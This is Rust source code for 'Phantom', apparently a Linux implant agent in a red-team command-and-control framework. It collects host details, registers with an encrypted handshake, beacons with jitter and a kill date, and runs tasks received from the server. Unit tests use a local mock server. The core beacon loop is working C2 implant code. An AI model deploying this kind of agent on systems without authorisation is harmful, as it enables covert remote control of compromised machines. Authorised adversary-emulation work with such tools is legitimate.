//! Core Phantom agent loop and task dispatch.

use std::fs;
use std::path::PathBuf;

use red_cell_common::crypto::{
    AgentCryptoMaterial, derive_session_keys, generate_agent_crypto_material,
};
use red_cell_common::demon::DemonCommand;
use tracing::{info, warn};

use crate::command::{PendingCallback, PhantomState, execute};
use crate::config::PhantomConfig;
use crate::error::PhantomError;
use crate::protocol::{
    AgentMetadata, build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
    parse_tasking_response,
};
use crate::transport::HttpTransport;

/// Running Phantom session state.
#[derive(Debug)]
pub struct PhantomAgent {
    agent_id: u32,
    raw_crypto: AgentCryptoMaterial,
    session_crypto: AgentCryptoMaterial,
    config: PhantomConfig,
    transport: HttpTransport,
    send_ctr_offset: u64,
    recv_ctr_offset: u64,
    state: PhantomState,
}

impl PhantomAgent {
    /// Create a new agent with fresh per-session crypto material.
    pub fn new(config: PhantomConfig) -> Result<Self, PhantomError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1;
        let raw_crypto = generate_agent_crypto_material()?;
        let session_crypto = match config.init_secret.as_deref() {
            Some(secret) => {
                derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
            }
            None => raw_crypto.clone(),
        };
        let transport = HttpTransport::new(&config)?;

        Ok(Self {
            agent_id,
            raw_crypto,
            session_crypto,
            config,
            transport,
            send_ctr_offset: 0,
            recv_ctr_offset: 0,
            state: PhantomState::default(),
        })
    }

    /// Return the current random agent identifier.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }

    /// Collect Linux host metadata for `DEMON_INIT`.
    pub fn collect_metadata(&self) -> AgentMetadata {
        AgentMetadata {
            hostname: read_trimmed("/etc/hostname").unwrap_or_else(|| String::from("unknown")),
            username: std::env::var("USER").unwrap_or_else(|_| String::from("unknown")),
            domain_name: String::from("WORKGROUP"),
            internal_ip: String::from("127.0.0.1"),
            process_path: std::env::current_exe()
                .map(|path| path.display().to_string())
                .unwrap_or_default(),
            process_pid: std::process::id(),
            process_tid: 0,
            process_ppid: parent_pid(),
            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
            elevated: is_elevated(),
            base_address: 0,
            os_major: 6,
            os_minor: 8,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 0,
            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
            sleep_delay: self.config.sleep_delay_ms,
            sleep_jitter: self.config.sleep_jitter,
            kill_date: self.config.kill_date.unwrap_or_default().max(0) as u64,
            working_hours: self.config.working_hours.unwrap_or(0),
        }
    }

    /// Perform the initial registration handshake.
    pub async fn init_handshake(&mut self) -> Result<(), PhantomError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
        let response = self.transport.send(&packet).await?;
        self.recv_ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
        Ok(())
    }

    /// Send a `COMMAND_CHECKIN` and process the returned task stream.
    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
        self.state.poll().await?;
        self.flush_pending_callbacks().await?;

        let payload = red_cell_common::demon::DemonMessage::new(vec![
            red_cell_common::demon::DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
        ])
        .to_bytes()?;
        let encrypted = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &self.session_crypto.key,
            &self.session_crypto.iv,
            self.send_ctr_offset,
            &payload,
        )?;
        let packet = red_cell_common::demon::DemonEnvelope::new(self.agent_id, encrypted.clone())?
            .to_bytes();

        let response = self.transport.send(&packet).await?;
        self.send_ctr_offset += callback_ctr_blocks(0);

        let tasking = parse_tasking_response(
            self.agent_id,
            &self.session_crypto,
            self.recv_ctr_offset,
            &response,
        )?;
        self.recv_ctr_offset = tasking.next_recv_ctr_offset;

        let mut exit_requested = false;
        for package in tasking.packages {
            execute(&package, &mut self.state).await?;
            for callback in self.state.drain_callbacks() {
                let payload = callback.payload()?;
                let packet = build_callback_packet(
                    self.agent_id,
                    &self.session_crypto,
                    self.send_ctr_offset,
                    callback.command_id(),
                    callback.request_id(),
                    &payload,
                )?;
                self.send_packet(packet).await?;
                self.send_ctr_offset += callback_ctr_blocks(payload.len());
                if matches!(callback, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
        }

        Ok(exit_requested)
    }

    /// Run the main callback loop until exit conditions are met.
    pub async fn run(&mut self) -> Result<(), PhantomError> {
        self.init_handshake().await?;
        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");

        loop {
            if self.kill_date_elapsed() {
                warn!("phantom kill date reached; exiting");
                break;
            }

            tokio::time::sleep(std::time::Duration::from_millis(self.compute_sleep_delay())).await;
            if self.checkin().await? {
                break;
            }
        }

        Ok(())
    }

    fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }

        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let spread = jitter_range.saturating_mul(2);
        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
        base.saturating_sub(jitter_range).saturating_add(jitter)
    }

    fn kill_date_elapsed(&self) -> bool {
        match self.config.kill_date {
            Some(kill_date) if kill_date > 0 => {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|duration| i64::try_from(duration.as_secs()).unwrap_or(i64::MAX))
                    .unwrap_or_default();
                now >= kill_date
            }
            _ => false,
        }
    }

    async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
        let _response = self.transport.send(&packet).await?;
        Ok(())
    }

    async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let packet = build_callback_packet(
                self.agent_id,
                &self.session_crypto,
                self.send_ctr_offset,
                callback.command_id(),
                callback.request_id(),
                &payload,
            )?;
            self.send_packet(packet).await?;
            self.send_ctr_offset += callback_ctr_blocks(payload.len());
        }

        Ok(())
    }
}

fn read_trimmed(path: impl Into<PathBuf>) -> Option<String> {
    let path = path.into();
    fs::read_to_string(path).ok().map(|value| value.trim().to_string())
}

fn parent_pid() -> u32 {
    read_trimmed("/proc/self/status")
        .and_then(|contents| {
            contents
                .lines()
                .find_map(|line| line.strip_prefix("PPid:\t"))
                .and_then(|value| value.trim().parse::<u32>().ok())
        })
        .unwrap_or_default()
}

fn is_elevated() -> bool {
    read_trimmed("/proc/self/status").and_then(|contents| {
        contents.lines().find_map(|line| {
            line.strip_prefix("Uid:\t").and_then(|value| {
                value.split_whitespace().next().and_then(|first| first.parse::<u32>().ok())
            })
        })
    }) == Some(0)
}

#[cfg(test)]
mod tests {
    use std::error::Error;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::mpsc;
    use std::thread;

    use red_cell_common::crypto::{
        ctr_blocks_for_len, decrypt_agent_data_at_offset, encrypt_agent_data,
        encrypt_agent_data_at_offset,
    };
    use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage, DemonPackage};

    use super::PhantomAgent;
    use super::callback_ctr_blocks;
    use crate::config::PhantomConfig;

    #[test]
    fn agent_creation_succeeds() -> Result<(), Box<dyn Error>> {
        let agent = PhantomAgent::new(PhantomConfig::default())?;
        assert_ne!(agent.agent_id(), 0);
        Ok(())
    }

    #[test]
    fn collect_metadata_uses_linux_defaults() -> Result<(), Box<dyn Error>> {
        let agent = PhantomAgent::new(PhantomConfig::default())?;
        let metadata = agent.collect_metadata();
        assert_eq!(metadata.domain_name, "WORKGROUP");
        assert!(metadata.process_pid > 0);
        Ok(())
    }

    #[test]
    fn compute_sleep_delay_honors_jitter_range() -> Result<(), Box<dyn Error>> {
        let config =
            PhantomConfig { sleep_delay_ms: 1_000, sleep_jitter: 20, ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;

        for _ in 0..128 {
            let delay = agent.compute_sleep_delay();
            assert!((800..=1_200).contains(&delay));
        }

        Ok(())
    }

    #[test]
    fn compute_sleep_delay_returns_base_without_jitter() -> Result<(), Box<dyn Error>> {
        let config =
            PhantomConfig { sleep_delay_ms: 1_337, sleep_jitter: 0, ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;

        assert_eq!(agent.compute_sleep_delay(), 1_337);
        Ok(())
    }

    #[tokio::test]
    async fn init_handshake_accepts_valid_acknowledgement()
    -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let request = read_http_request(&mut stream)?;
            request_tx.send(request)?;

            let body = response_rx.recv()?;
            write_http_response(&mut stream, &body)?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;
        let ack = encrypt_agent_data(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            &agent.agent_id.to_le_bytes(),
        )?;
        response_tx.send(ack)?;

        agent.init_handshake().await?;

        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!init_packet.is_empty());
        assert_eq!(agent.recv_ctr_offset, 1);

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;

        Ok(())
    }

    #[tokio::test]
    async fn checkin_processes_exit_task() -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            for _ in 0..3 {
                let (mut stream, _) = listener.accept()?;
                let request = read_http_request(&mut stream)?;
                request_tx.send(request)?;
                let body = response_rx.recv()?;
                write_http_response(&mut stream, &body)?;
            }
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;

        response_tx.send(encrypt_agent_data(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            &agent.agent_id.to_le_bytes(),
        )?)?;
        agent.init_handshake().await?;

        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!init_packet.is_empty());

        let task = DemonPackage::new(DemonCommand::CommandExit, 7, 9_i32.to_le_bytes().to_vec());
        let task_message = DemonMessage::new(vec![task]).to_bytes()?;
        let encrypted_task = encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            agent.recv_ctr_offset,
            &task_message,
        )?;
        let response = DemonEnvelope::new(agent.agent_id, encrypted_task)?.to_bytes();
        let expected_recv_ctr_offset =
            agent.recv_ctr_offset + ctr_blocks_for_len(response.len() - 12);
        response_tx.send(response)?;
        response_tx.send(Vec::new())?;

        let exit_requested = agent.checkin().await?;
        assert!(exit_requested);

        let checkin_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        let envelope = DemonEnvelope::from_bytes(&checkin_packet)?;
        let decrypted = decrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            0,
            &envelope.payload,
        )?;
        let message = DemonMessage::from_bytes(&decrypted)?;
        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command()?, DemonCommand::CommandCheckin);
        assert_eq!(agent.send_ctr_offset, callback_ctr_blocks(0) + callback_ctr_blocks(4));
        assert_eq!(agent.recv_ctr_offset, expected_recv_ctr_offset);

        let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!exit_callback_packet.is_empty());

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;

        Ok(())
    }

    fn read_http_request(
        stream: &mut std::net::TcpStream,
    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
        let mut request = Vec::new();
        let mut buffer = [0_u8; 4096];
        let mut header_end = None;
        let mut content_length = 0_usize;

        loop {
            let read = stream.read(&mut buffer)?;
            if read == 0 {
                break;
            }
            request.extend_from_slice(&buffer[..read]);

            if header_end.is_none() {
                header_end = request
                    .windows(4)
                    .position(|window| window == b"\r\n\r\n")
                    .map(|index| index + 4);
                if let Some(end) = header_end {
                    let headers = std::str::from_utf8(&request[..end])?;
                    content_length = headers
                        .lines()
                        .find_map(|line| {
                            let (name, value) = line.split_once(':')?;
                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
                        })
                        .unwrap_or("0")
                        .parse::<usize>()?;
                }
            }

            if let Some(end) = header_end
                && request.len() >= end + content_length
            {
                break;
            }
        }

        let body = header_end.map_or_else(Vec::new, |end| request[end..].to_vec());
        Ok(body)
    }

    fn write_http_response(
        stream: &mut std::net::TcpStream,
        body: &[u8],
    ) -> Result<(), Box<dyn Error + Send + Sync>> {
        stream.write_all(
            format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .as_bytes(),
        )?;
        stream.write_all(body)?;
        Ok(())
    }
}
